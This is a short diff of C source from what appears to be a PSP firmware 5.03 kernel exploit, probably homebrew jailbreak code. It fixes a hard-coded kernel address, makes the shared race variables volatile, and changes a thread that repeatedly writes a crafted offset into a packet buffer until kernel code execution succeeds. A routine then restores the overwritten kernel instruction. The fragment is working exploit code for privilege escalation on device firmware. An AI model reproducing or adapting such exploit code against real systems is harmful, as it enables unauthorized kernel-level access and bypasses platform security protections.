@@ -37,7 +37,7 @@
 //#define LIBC_TIME_ADDR 0x8800F798
 
 // PSP 5.03
-#define LIBC_TIME_ADDR 0x0000F030
+#define LIBC_TIME_ADDR 0x8800F030
 
 UserFunctions* g_tbl;
 
@@ -49,7 +49,8 @@ void (* _sceKernelCpuResumeIntr)(unsigned int flags) = (void*)NULL;
 
 int savedata_open = 0;
 
-u32 packet[256], is_exploited, libctime_addr=LIBC_TIME_ADDR;
+volatile u32 packet[256];
+volatile int is_exploited;
 
 void executeKernel(u32 kernelContentFunction)
 {
@@ -57,7 +58,7 @@ void executeKernel(u32 kernelContentFunction)
 }
 
 void repairInstruction(KernelFunctions* k_tbl){
-    _sw(0x8C654384, libctime_addr); // recover the damage we've done
+    _sw(0x8C654384, LIBC_TIME_ADDR); // recover the damage we've done
 }
 
 void KernelFunction()
@@ -100,7 +101,7 @@ int stubScanner(UserFunctions* tbl){
 int qwik_thread()
 {
     while (is_exploited != 1) {
-        packet[9] = libctime_addr - 18 - (u32)&packet;
+        packet[9] = LIBC_TIME_ADDR - 18 - (u32)packet;
         g_tbl->KernelDelayThread(0);
     }
 
